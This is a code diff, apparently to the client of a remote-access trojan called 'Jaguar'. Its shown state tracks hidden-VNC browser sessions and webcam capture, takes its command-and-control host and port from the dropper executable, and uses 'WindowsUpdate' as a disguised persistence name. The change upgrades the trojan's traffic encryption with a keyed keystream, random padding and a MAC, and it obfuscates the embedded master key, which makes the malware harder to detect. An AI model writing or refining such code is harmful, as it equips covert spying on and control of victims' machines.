@@ -24,7 +24,7 @@ SLEEP = 3.0
 JITTER = 0.2
 NOMBRE_CLAVE = "WindowsUpdate"
 
-# Prioridad: env (lo define el .exe) → constantes. Los scripts pasan argv.
+# Prioridad: env (lo define el .exe) -> constantes. Los scripts pasan argv.
 HOST = os.environ.get("JAGUAR_HOST", HOST)
 try:
     PORT = int(os.environ.get("JAGUAR_PORT", PORT))
@@ -40,19 +40,62 @@ _SALIR = False
 _HVNC = {"pid": None, "hwnd": None, "hdesk": None, "navegador": None, "epro": None}
 _WCAM = {"on": False, "frame": b"", "w": 0, "h": 0}
 
-# ============================ CRIPTO JAGUAR (XOR rotativo) ==================
+# ============================ CRIPTO JAGUAR ================================
 # MISMO algoritmo que jaguar/common/cripto.py — no cambiar el uno sin el otro.
-_CLAVE_XOR = b"J4GU4R-2026-clave-compartida"
+_K_OBF = bytes([
+    0x10, 0x6E, 0x1D, 0x0F, 0x6E, 0x08, 0x77, 0x68, 0x6A, 0x68,
+    0x6C, 0x77, 0x39, 0x36, 0x3B, 0x2C, 0x3F, 0x77, 0x39, 0x35,
+    0x37, 0x2A, 0x3B, 0x28, 0x2E, 0x33, 0x3E, 0x3B,
+])
+_CLAVE_MAESTRA = bytes(b ^ 0x5A for b in _K_OBF)
+_SAL = b"jaguar-v1"
+_ITER = 100_000
+_CI = None
+_MA = None
+
+
+def _cinit():
+    global _CI, _MA
+    if _CI is None:
+        m = hashlib.pbkdf2_hmac("sha256", _CLAVE_MAESTRA, _SAL, _ITER, dklen=64)
+        _CI, _MA = m[:32], m[32:]
+
+
+def _ks(nonce, n):
+    _cinit()
+    out = bytearray()
+    c = 0
+    while len(out) < n:
+        out += hmac.new(_CI, nonce + struct.pack(">Q", c), hashlib.sha256).digest()
+        c += 1
+    return bytes(out[:n])
+
+
+def _xor(a, b):
+    return bytes(x ^ y for x, y in zip(a, b))
 
 
 def cifrar(datos):
+    _cinit()
     if isinstance(datos, str):
         datos = datos.encode("utf-8")
-    n = len(_CLAVE_XOR)
-    return bytes(b ^ _CLAVE_XOR[i % n] for i, b in enumerate(datos))
+    pad = os.urandom(os.urandom(1)[0])
+    cuerpo = struct.pack(">H", len(pad)) + pad + datos
+    nonce = os.urandom(16)
+    ct = _xor(cuerpo, _ks(nonce, len(cuerpo)))
+    mac = hmac.new(_MA, nonce + ct, hashlib.sha256).digest()
+    return nonce + ct + mac
 
 
-descifrar = cifrar
+def descifrar(blob):
+    _cinit()
+    if len(blob) < 48:
+        raise ValueError("trama corta")
+    nonce, ct, mac = blob[:16], blob[16:-32], blob[-32:]
+    if not hmac.compare_digest(mac, hmac.new(_MA, nonce + ct, hashlib.sha256).digest()):
+        raise ValueError("MAC inválido")
+    cuerpo = _xor(ct, _ks(nonce, len(ct)))
+    return cuerpo[2 + struct.unpack(">H", cuerpo[:2])[0]:]
 # ========================== FIN CRIPTO JAGUAR ==============================
 
 
